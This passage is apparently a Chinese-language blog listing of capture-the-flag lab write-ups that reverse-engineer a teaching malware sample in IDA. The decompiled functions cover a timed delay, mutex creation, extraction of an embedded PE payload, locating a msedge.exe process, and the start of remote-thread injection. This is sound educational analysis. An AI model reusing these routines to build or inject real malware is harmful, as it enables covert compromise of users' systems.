:::spoiler IDA Source Code<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>waitUntil20231118</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  HANDLE Result; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  HANDLE hTimer; <span style=color:#75715e>// [rsp+30h] [rbp-38h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  SYSTEMTIME SystemTime; <span style=color:#75715e>// [rsp+38h] [rbp-30h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>_FILETIME</span> FileTime; <span style=color:#75715e>// [rsp+48h] [rbp-20h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  LARGE_INTEGER DueTime; <span style=color:#75715e>// [rsp+50h] [rbp-18h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  SystemTime.wYear <span style=color:#f92672>=</span> <span style=color:#ae81ff>2023</span>;
</span></span><span style=display:flex><span>  SystemTime.wMonth <span style=color:#f92672>=</span> <span style=color:#ae81ff>11</span>;
</span></span><span style=display:flex><span>  SystemTime.wDay <span style=color:#f92672>=</span> <span style=color:#ae81ff>18</span>;
</span></span><span style=display:flex><span>  SystemTime.wDayOfWeek <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>;
</span></span><span style=display:flex><span>  SystemTime.wHour <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  SystemTime.wMinute <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  SystemTime.wSecond <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  SystemTime.wMilliseconds <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  LODWORD(Result) <span style=color:#f92672>=</span> SystemTimeToFileTime(<span style=color:#f92672>&amp;</span>SystemTime, <span style=color:#f92672>&amp;</span>FileTime);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( Result )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    DueTime <span style=color:#f92672>=</span> FileTime;
</span></span><span style=display:flex><span>    Result <span style=color:#f92672>=</span> CreateWaitableTimerW(<span style=color:#ae81ff>0</span>i64, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>i64);
</span></span><span style=display:flex><span>    hTimer <span style=color:#f92672>=</span> Result;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( Result )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      LODWORD(Result) <span style=color:#f92672>=</span> SetWaitableTimer(Result, <span style=color:#f92672>&amp;</span>DueTime, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>i64, <span style=color:#ae81ff>0</span>i64, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( Result )
</span></span><span style=display:flex><span>        LODWORD(Result) <span style=color:#f92672>=</span> WaitForSingleObject(hTimer, <span style=color:#ae81ff>0xFFFFFFFF</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> Result;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::</li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>攻擊者的完整意圖</p><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x182023-lab---winmalware---sub_140001120>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)
<a class=anchor href=#simple-reverse---0x182023-lab---winmalware---sub_140001120>#</a></h1><h2 id=description>Description
<a class=anchor href=#description>#</a></h2><blockquote><p>分析 eductf-lab.exe 中的 function sub_140001120 在做什麼，並找出其所建立的 Mutex 的名稱。
Flag format: FLAG{mutex_name}</p></blockquote><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-createmutexa>CreateMutexA</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror>GetLastError</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/sync/using-mutex-objects>使用 Mutex 物件</a><blockquote><p>可以使用 mutex 物件 來保護共用資源，避免多個執行緒或進程同時存取。 每個執行緒都必須等候 mutex 的擁有權，才能執行可存取共用資源的程式碼。 例如，如果數個執行緒共用資料庫的存取權，執行緒可以使用 mutex 物件一次只允許一個執行緒寫入資料庫。</p></blockquote></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/debug/system-error-codes--0-499->系統錯誤碼 (0-499)</a><blockquote><p>ERROR_ALREADY_EXISTS
183 (0xB7)
無法建立檔案，該檔案已存在。</p></blockquote></li></ul><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><ul><li>sub_140001120
:::spoiler IDA Source Code<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>sub_140001120</span>()
</span></span><span style=display:flex><span>{    
</span></span><span style=display:flex><span>  HANDLE MutexA; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// [rsp+20h] [rbp-78h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v3[<span style=color:#ae81ff>2</span>]; <span style=color:#75715e>// [rsp+30h] [rbp-68h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CHAR Name[<span style=color:#ae81ff>32</span>]; <span style=color:#75715e>// [rsp+38h] [rbp-60h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> v5[<span style=color:#ae81ff>32</span>]; <span style=color:#75715e>// [rsp+58h] [rbp-40h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v3[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1684234874</span>;
</span></span><span style=display:flex><span>  qmemcpy(v5, <span style=color:#f92672>&amp;</span>unk_140003348, <span style=color:#ae81ff>0x1Du</span>i64);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>28</span>; <span style=color:#f92672>++</span>i )
</span></span><span style=display:flex><span>    Name[i] <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(v3 <span style=color:#f92672>+</span> i <span style=color:#f92672>%</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>^</span> v5[i];
</span></span><span style=display:flex><span>  MutexA <span style=color:#f92672>=</span> CreateMutexA(<span style=color:#ae81ff>0</span>i64, <span style=color:#ae81ff>1</span>, Name);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( MutexA )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    LODWORD(MutexA) <span style=color:#f92672>=</span> GetLastError();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( MutexA <span style=color:#f92672>==</span> <span style=color:#ae81ff>183</span> )
</span></span><span style=display:flex><span>      exit(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> MutexA;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::</li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題有個小地方要注意，雖然觀察過source code是非常簡單的建立mutex的操作，題目想要知道的mutex name也非常簡單，只是個xor就知道的東西，不過在實作上需要注意endian的問題，一開始我是直接按照<code>0x64, 0x63, 0x62, 0x7A</code>的順序，但結果輸出一些ascii的字元，其實他是從後面讀進來再開始操作xor</p><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)
<a class=anchor href=#simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload>#</a></h1><h2 id=description>Description
<a class=anchor href=#description>#</a></h2><blockquote><p>取出 eductf-lab.exe 中的 next stage payload (embedded PE file)，並計算其 MD5 hash。
Flag format: FLAG{462fe0000&mldr;} (hex character must be lowercase)</p></blockquote><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li>DOS Header
<img src=https://hackmd.io/_uploads/HJ9P9gpfp.png alt></li><li>NT Headers - Optional Header
<img src=https://hackmd.io/_uploads/SkjNqeazT.png alt></li></ul><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><ul><li>sub_140001870
:::spoiler IDA Source Code解析前<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>sub_140001870</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>pe_file, _QWORD <span style=color:#f92672>*</span>pe_file_size)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>pe_file <span style=color:#f92672>=</span> byte_140005040;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>pe_file_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>72770</span>i64;                     <span style=color:#75715e>// 這是個是怎麼判斷成PE size我也不知道
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>**</span>pe_file <span style=color:#f92672>==</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>ZM<span style=color:#960050;background-color:#1e0010>&#39;</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>(sub_1400013D0(<span style=color:#f92672>*</span>pe_file) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x20B</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>i64;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      sub_140001260(<span style=color:#e6db74>&#34;remote dll optional header magic check failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    sub_140001260(<span style=color:#e6db74>&#34;remote dll magic check failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::</li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li>進到<code>sub_140001BF0</code>之後可以先觀察<code>sub_140001870</code>，前面有source code可以看到他正在比對<code>byte_140005040</code>的前面兩個字元是不是等於<code>MZ</code>，也就是一支PE file的magic header，並且又比對了後面0x18的位置是不是等於0x20B，也就是另外一個magic header(用來判斷該程式是否可於64-bits運行)，由以上操作幾乎可以確定駭客把真正的程式(可能是惡意的)塞在正常的PE file中
:::info
如果只是要解題的話，到這邊就可以了，只要利用前一題學到的把<code>byte_140005040</code>改變他的type，變成<code>char[72770]</code>，再用Shift+E，把raw data export出來，丟到<a href=https://emn178.github.io/online-tools/md5_checksum.html>online md5 checksum</a>，就可以得到這支檔案的hash(<code>462fe0007f86957f59824e113f78947c</code>)
<img src=https://hackmd.io/_uploads/SJoeiepGT.png alt>
<img src=https://hackmd.io/_uploads/rk7SigpGp.png alt>
:::</li><li><code>sub_1400013D0</code>仔細看他的操作，其實就是把<code>byte_140005040</code>的地址，加上<code>0x3C</code>，再取值，就是<code>e_lfanew</code>，也就是NT Headers的file offset，這個offset加上原本的原本的<code>140005040</code>就是NT header，所以可以把<code>sub_1400013D0</code> rename成<code>getNtHdr</code><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>getNtHdr</span>(<span style=color:#66d9ef>__int64</span> a1)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#f92672>*</span>(a1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x3C</span>) <span style=color:#f92672>+</span> a1;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>接下來可以改變這個function的type，按Y，<code>改IMAGE_NT_HEADERS *__fastcall getNtHdr(_QWORD)</code>，就變得非常簡潔好看，另外，要把<code>pe_file</code>的type從<code>_int64</code>改成<code>_QWORD</code>的原因是<code>pe_file</code>存的是<code>byte_140005040</code>的地址，不是數字，雖然代表的byte數一樣，但意義不相同，所以IDA可能會解析不出來
<img src=https://hackmd.io/_uploads/ryHl0gaG6.png alt>
<img src=https://hackmd.io/_uploads/rJniAlaM6.png alt></li><li>最後就把目前的這個sub function rename成<code>getEmbeddedPE_File</code>就可以了</li></ol><p>:::info
<img src=https://hackmd.io/_uploads/HJaNxWpzp.png alt>
:::
:::spoiler 解析後</p><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)
<a class=anchor href=#simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot>CreateToolhelp32Snapshot</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-process32firstw>Process32FirstW</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess>GetCurrentProcess</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess>OpenProcess</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/securitybaseapi/nf-securitybaseapi-equalsid>EqualSid</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-process32nextw>Process32NextW</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken>OpenProcessToken</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation>GetTokenInformation</a></li></ul><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><ul><li>sub_1400016B0
:::spoiler IDA Source Code解析前<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#a6e22e>returnTargetPid</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  DWORD LastError; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD v2; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  WCHAR <span style=color:#f92672>*</span>szExeFile; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>signed</span> <span style=color:#66d9ef>__int64</span> v4; <span style=color:#75715e>// rcx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  WCHAR v5; <span style=color:#75715e>// dx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v6; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD th32ProcessID; <span style=color:#75715e>// [rsp+20h] [rbp-288h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  HANDLE hSnapshot; <span style=color:#75715e>// [rsp+28h] [rbp-280h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  HANDLE hObject; <span style=color:#75715e>// [rsp+30h] [rbp-278h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  HANDLE CurrentProcess; <span style=color:#75715e>// [rsp+38h] [rbp-270h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  PSID pSid1; <span style=color:#75715e>// [rsp+40h] [rbp-268h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  PSID pSid2; <span style=color:#75715e>// [rsp+48h] [rbp-260h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  PROCESSENTRY32W pe; <span style=color:#75715e>// [rsp+50h] [rbp-258h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  hSnapshot <span style=color:#f92672>=</span> CreateToolhelp32Snapshot(<span style=color:#ae81ff>2u</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( hSnapshot <span style=color:#f92672>==</span> (HANDLE)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>i64 )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    LastError <span style=color:#f92672>=</span> GetLastError();
</span></span><span style=display:flex><span>    sub_140001260(<span style=color:#e6db74>&#34;CreateToolhelp32Snapshot failed with error %lu</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, LastError);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    pe.dwSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>568</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( Process32FirstW(hSnapshot, <span style=color:#f92672>&amp;</span>pe) )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      pSid2 <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>0x44u</span>i64);
</span></span><span style=display:flex><span>      CurrentProcess <span style=color:#f92672>=</span> GetCurrentProcess();
</span></span><span style=display:flex><span>      sub_140001500(CurrentProcess, <span style=color:#f92672>&amp;</span>pSid2);
</span></span><span style=display:flex><span>      th32ProcessID <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        pSid1 <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>0x44u</span>i64);
</span></span><span style=display:flex><span>        hObject <span style=color:#f92672>=</span> OpenProcess(<span style=color:#ae81ff>0x400u</span>, <span style=color:#ae81ff>0</span>, pe.th32ProcessID);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( hObject )
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)sub_140001500(hObject, <span style=color:#f92672>&amp;</span>pSid1) )
</span></span><span style=display:flex><span>          {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ( EqualSid(pSid1, pSid2) )
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>              szExeFile <span style=color:#f92672>=</span> pe.szExeFile;
</span></span><span style=display:flex><span>              v4 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;msedge.exe&#34;</span> <span style=color:#f92672>-</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)pe.szExeFile;
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>              {
</span></span><span style=display:flex><span>                v5 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>szExeFile;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>szExeFile <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(WCHAR <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)szExeFile <span style=color:#f92672>+</span> v4) )
</span></span><span style=display:flex><span>                  <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                <span style=color:#f92672>++</span>szExeFile;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>v5 )
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                  v6 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>                  <span style=color:#66d9ef>goto</span> LABEL_14;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>              }
</span></span><span style=display:flex><span>              v6 <span style=color:#f92672>=</span> v5 <span style=color:#f92672>&lt;</span> <span style=color:#f92672>*</span>(WCHAR <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)szExeFile <span style=color:#f92672>+</span> v4) <span style=color:#f92672>?</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>LABEL_14:
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>v6 )
</span></span><span style=display:flex><span>                th32ProcessID <span style=color:#f92672>=</span> pe.th32ProcessID;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            free(pSid1);
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>          CloseHandle(hObject);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span> ( <span style=color:#f92672>!</span>th32ProcessID <span style=color:#f92672>&amp;&amp;</span> Process32NextW(hSnapshot, <span style=color:#f92672>&amp;</span>pe) );
</span></span><span style=display:flex><span>      free(pSid2);
</span></span><span style=display:flex><span>      CloseHandle(hSnapshot);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> th32ProcessID;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v2 <span style=color:#f92672>=</span> GetLastError();
</span></span><span style=display:flex><span>      sub_140001260(<span style=color:#e6db74>&#34;Process32First failed with error %lu</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, v2);
</span></span><span style=display:flex><span>      CloseHandle(hSnapshot);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}    
</span></span></code></pre></div>:::</li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li><p>首先，他先利用<code>CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)</code>把當前系統中所有的process都snapshot，並回傳指定快照集的開啟控制碼(handle)</p><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)
<a class=anchor href=#simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex>VirtualAllocEx</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants>記憶體保護常數</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory>WriteProcessMemory</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread>CreateRemoteThread</a></li><li>Export Address Table(EAT)<blockquote><p><img src=https://hackmd.io/_uploads/rJuBbwaGT.png alt>
<img src=https://hackmd.io/_uploads/HJEI-P6zp.png alt>
<img src=https://hackmd.io/_uploads/S1Qu-PTM6.png alt></p></blockquote></li></ul><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code <code>sub_140001A60</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>sub_140001A60</span>(DWORD edge_pid, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>pe_file, SIZE_T pe_file_size)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  DWORD v4; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD LastError; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  HANDLE hProcess; <span style=color:#75715e>// [rsp+40h] [rbp-38h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>lpBaseAddress; <span style=color:#75715e>// [rsp+48h] [rbp-30h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  LPTHREAD_START_ROUTINE lpStartAddress; <span style=color:#75715e>// [rsp+50h] [rbp-28h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>__int64</span> v9; <span style=color:#75715e>// [rsp+58h] [rbp-20h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD ThreadId; <span style=color:#75715e>// [rsp+60h] [rbp-18h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v9 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  sub_1400018F0(pe_file, <span style=color:#f92672>&amp;</span>v9);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v9 )
</span></span><span style=display:flex><span>  {
